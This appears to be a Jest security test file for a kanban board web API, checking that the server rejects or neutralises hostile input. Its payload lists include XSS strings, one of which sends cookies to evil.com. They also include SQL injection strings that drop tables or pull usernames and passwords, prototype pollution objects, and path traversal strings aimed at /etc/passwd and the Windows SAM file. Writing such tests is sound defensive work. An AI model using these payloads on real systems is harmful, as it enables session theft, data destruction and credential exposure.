import { DatabaseFactory, KanbanDB } from '@kanban-mcp/db';
import { WebServer } from '../../src/web-server';
import { AuthService } from '../../src/auth/auth.service';

describe('Input Validation and XSS Prevention Tests', () => {
  let databaseService: any;
  let kanbanDb: KanbanDB;
  let webServer: WebServer;
  let serverInstance: any;
  let authService: AuthService;
  let validToken: string;

  beforeEach(async () => {
    // Create a new in-memory database for each test
    databaseService = await DatabaseFactory.createLegacyDatabase({
      provider: 'sqlite',
      url: 'file::memory:?cache=shared',
    });

    // Create a new KanbanDB instance with the database service
    kanbanDb = new KanbanDB(databaseService);

    // Create and start web server
    webServer = new WebServer(kanbanDb);
    serverInstance = webServer.getServer();
    await serverInstance.ready();

    // Initialize auth service and create valid token
    authService = new AuthService();
    validToken = authService.generateAccessToken({
      id: 'test-user',
      email: 'test@example.com',
      name: 'Test User',
      role: 'user',
      createdAt: new Date()
    });
  });

  afterEach(async () => {
    // Close connections
    await webServer.close();
    await kanbanDb.close();
  });

  describe('XSS Prevention in Board Creation', () => {
    it('should sanitize XSS payloads in board names', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        '"><script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<svg onload="alert(\'xss\')">',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '<body onload="alert(\'xss\')">',
        '<div onclick="alert(\'xss\')">Click me</div>',
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E',
        '\"><svg/onload=alert(/xss/)>',
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: { name: payload, goal: 'Test goal' }
        });

        // Should either validate/sanitize or reject
        if (response.statusCode === 400) {
          const body = JSON.parse(response.payload);
          expect(body.code).toBe('VALIDATION_ERROR');
        } else if (response.statusCode === 201) {
          // If accepted, verify XSS was sanitized
          const body = JSON.parse(response.payload);
          expect(body.success).toBe(true);
          
          // Get the board and verify content is safe
          const boardResponse = await serverInstance.inject({
            method: 'GET',
            url: `/api/v1/boards/${body.boardId}`,
            headers: {
              'Authorization': `Bearer ${validToken}`
            }
          });
          
          const boardData = JSON.parse(boardResponse.payload);
          expect(boardData.name).not.toContain('<script>');
          expect(boardData.name).not.toContain('javascript:');
          expect(boardData.name).not.toContain('onerror=');
          expect(boardData.name).not.toContain('onload=');
        }
      }
    });

    it('should sanitize XSS payloads in board goals', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        'javascript:void(0)',
        '<svg/onload=alert(1)>',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: { name: 'Test Board', goal: payload }
        });

        // Should either validate/sanitize or reject
        if (response.statusCode === 400) {
          const body = JSON.parse(response.payload);
          expect(body.code).toBe('VALIDATION_ERROR');
        } else if (response.statusCode === 201) {
          // If accepted, verify XSS was sanitized
          const body = JSON.parse(response.payload);
          const boardResponse = await serverInstance.inject({
            method: 'GET',
            url: `/api/v1/boards/${body.boardId}`,
            headers: {
              'Authorization': `Bearer ${validToken}`
            }
          });
          
          const boardData = JSON.parse(boardResponse.payload);
          expect(boardData.goal).not.toContain('<script>');
          expect(boardData.goal).not.toContain('javascript:');
          expect(boardData.goal).not.toContain('onerror=');
        }
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in board creation', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE boards; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM boards --",
        "'; DELETE FROM boards WHERE 1=1; --",
        "' OR 1=1 --",
        "admin'/*",
        "' AND 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "1' OR '1'='1' /*",
        "'; INSERT INTO boards (name) VALUES ('hacked'); --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: { name: payload, goal: 'Test goal' }
        });

        // SQL injection should not succeed
        if (response.statusCode === 201) {
          // If board was created, verify it was treated as literal string
          const body = JSON.parse(response.payload);
          const boardResponse = await serverInstance.inject({
            method: 'GET',
            url: `/api/v1/boards/${body.boardId}`,
            headers: {
              'Authorization': `Bearer ${validToken}`
            }
          });
          
          const boardData = JSON.parse(boardResponse.payload);
          // Name should be stored as literal string, not executed as SQL
          expect(boardData.name).toBe(payload);
        }

        // Verify database integrity - no extra boards created
        const allBoardsResponse = await serverInstance.inject({
          method: 'GET',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`
          }
        });
        
        const allBoards = JSON.parse(allBoardsResponse.payload);
        // Should not have created unexpected boards
        expect(Array.isArray(allBoards)).toBe(true);
      }
    });

    it('should prevent SQL injection in task operations', async () => {
      // First create a board
      const boardResponse = await serverInstance.inject({
        method: 'POST',
        url: '/api/v1/boards',
        headers: {
          'Authorization': `Bearer ${validToken}`,
          'content-type': 'application/json',
        },
        payload: { name: 'Test Board', goal: 'Test Goal' }
      });

      expect(boardResponse.statusCode).toBe(201);
      const boardBody = JSON.parse(boardResponse.payload);
      const boardId = boardBody.boardId;

      // Get board details to find column ID
      const boardDetailsResponse = await serverInstance.inject({
        method: 'GET',
        url: `/api/v1/boards/${boardId}`,
        headers: {
          'Authorization': `Bearer ${validToken}`
        }
      });

      const boardDetails = JSON.parse(boardDetailsResponse.payload);
      const columnId = boardDetails.columns[0].id;

      const sqlInjectionPayloads = [
        "'; DROP TABLE tasks; --",
        "' OR 1=1 --",
        "'; UPDATE tasks SET title='hacked' WHERE 1=1; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/tasks',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: { 
            columnId: columnId,
            title: payload,
            content: 'Test content'
          }
        });

        // Task creation should handle SQL injection safely
        if (response.statusCode === 201) {
          const body = JSON.parse(response.payload);
          // Verify the title was stored as literal string
          expect(body.task.title).toBe(payload);
        }
      }
    });
  });

  describe('Input Validation Edge Cases', () => {
    it('should handle extremely long input strings', async () => {
      const longName = 'A'.repeat(10000); // Very long name
      const longGoal = 'B'.repeat(50000); // Very long description

      const response = await serverInstance.inject({
        method: 'POST',
        url: '/api/v1/boards',
        headers: {
          'Authorization': `Bearer ${validToken}`,
          'content-type': 'application/json',
        },
        payload: { name: longName, goal: longGoal }
      });

      // Should reject or truncate overly long input
      expect([400, 413]).toContain(response.statusCode);
      
      if (response.statusCode === 400) {
        const body = JSON.parse(response.payload);
        expect(body.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should handle null and undefined values safely', async () => {
      const invalidInputs = [
        { name: null, goal: 'Test goal' },
        { name: 'Test name', goal: null },
        { name: undefined, goal: 'Test goal' },
        { name: 'Test name', goal: undefined },
        { name: null, goal: null },
        { name: '', goal: '' }, // Empty strings
      ];

      for (const input of invalidInputs) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: input
        });

        // Should validate and reject invalid input
        expect(response.statusCode).toBe(400);
        const body = JSON.parse(response.payload);
        expect(body.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should handle unicode and special characters safely', async () => {
      const unicodeInputs = [
        { name: '🚀 Board with émojis', goal: 'Testing unicode: 中文, العربية, русский' },
        { name: 'Board with \u0000 null byte', goal: 'Test goal' },
        { name: 'Board with \r\n newlines', goal: 'Goal with \t tabs' },
        { name: 'Board with "quotes" and \'apostrophes\'', goal: 'Goal with `backticks`' },
        { name: 'Board with / forward & back \\ slashes', goal: 'Goal with | pipes' },
      ];

      for (const input of unicodeInputs) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: input
        });

        // Should handle unicode safely
        if (response.statusCode === 201) {
          const body = JSON.parse(response.payload);
          const boardResponse = await serverInstance.inject({
            method: 'GET',
            url: `/api/v1/boards/${body.boardId}`,
            headers: {
              'Authorization': `Bearer ${validToken}`
            }
          });
          
          const boardData = JSON.parse(boardResponse.payload);
          // Unicode should be preserved safely
          expect(boardData.name).toBeTruthy();
          expect(boardData.goal).toBeTruthy();
        }
      }
    });
  });

  describe('Content Security Policy Validation', () => {
    it('should include CSP headers in responses', async () => {
      const response = await serverInstance.inject({
        method: 'GET',
        url: '/api/v1/boards',
        headers: {
          'Authorization': `Bearer ${validToken}`
        }
      });

      expect(response.statusCode).toBe(200);
      expect(response.headers['content-security-policy']).toBeDefined();
      
      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("object-src 'none'");
    });

    it('should prevent inline script execution through CSP', async () => {
      // This test verifies CSP headers are set correctly
      // In a real browser, CSP would prevent inline script execution
      const response = await serverInstance.inject({
        method: 'GET',
        url: '/health'
      });

      const csp = response.headers['content-security-policy'];
      expect(csp).toBeDefined();
      expect(csp).not.toContain("'unsafe-inline'");
      expect(csp).not.toContain("'unsafe-eval'");
    });
  });

  describe('JSON Parsing Security', () => {
    it('should handle malformed JSON safely', async () => {
      const malformedJsonInputs = [
        '{"name": "test", "goal": }', // Invalid JSON
        '{"name": "test", "goal": "test"', // Incomplete JSON
        'not json at all',
        '{"name": "test", "goal": "test", "extra": {"nested": {"deeply": {"very": {"deep": {}}}}}}}', // Very nested
        '[]', // Array instead of object
        'null',
        '{"name": null, "goal": null}',
      ];

      for (const jsonInput of malformedJsonInputs) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: jsonInput
        });

        // Should handle malformed JSON gracefully
        expect(response.statusCode).toBe(400);
      }
    });

    it('should prevent JSON prototype pollution', async () => {
      const prototypePollutionPayloads = [
        {
          "name": "test",
          "goal": "test",
          "__proto__": { "isAdmin": true as any }
        } as any,
        {
          "name": "test",
          "goal": "test",
          "constructor": { "prototype": { "isAdmin": true } }
        } as any,
        {
          "name": "test",
          "goal": "test",
          "prototype": { "isAdmin": true }
        } as any
      ];

      for (const payload of prototypePollutionPayloads) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': 'application/json',
          },
          payload: payload
        });

        // Should not allow prototype pollution
        // Verify Object.prototype was not polluted
        expect((Object.prototype as any).isAdmin).toBeUndefined();
        
        if (response.statusCode === 201) {
          // If request succeeded, verify only expected properties exist
          const body = JSON.parse(response.payload);
          expect(body).not.toHaveProperty('__proto__');
          expect(body).not.toHaveProperty('constructor');
          expect(body).not.toHaveProperty('prototype');
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal in URL parameters', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await serverInstance.inject({
          method: 'GET',
          url: `/api/v1/boards/${payload}`,
          headers: {
            'Authorization': `Bearer ${validToken}`
          }
        });

        // Should not allow path traversal - should get 404 or validation error
        expect([400, 404]).toContain(response.statusCode);
      }
    });
  });

  describe('MIME Type Validation', () => {
    it('should validate content-type headers', async () => {
      const invalidContentTypes = [
        'text/plain',
        'application/xml',
        'multipart/form-data',
        'application/x-www-form-urlencoded',
        'text/html',
      ];

      for (const contentType of invalidContentTypes) {
        const response = await serverInstance.inject({
          method: 'POST',
          url: '/api/v1/boards',
          headers: {
            'Authorization': `Bearer ${validToken}`,
            'content-type': contentType,
          },
          payload: '{"name": "test", "goal": "test"}'
        });

        // Should reject non-JSON content types for JSON endpoints
        expect([400, 415]).toContain(response.statusCode);
      }
    });

    it('should handle missing content-type gracefully', async () => {
      const response = await serverInstance.inject({
        method: 'POST',
        url: '/api/v1/boards',
        headers: {
          'Authorization': `Bearer ${validToken}`,
          // No content-type header
        },
        payload: '{"name": "test", "goal": "test"}'
      });

      // Should handle missing content-type
      expect([400, 415]).toContain(response.statusCode);
    });
  });
});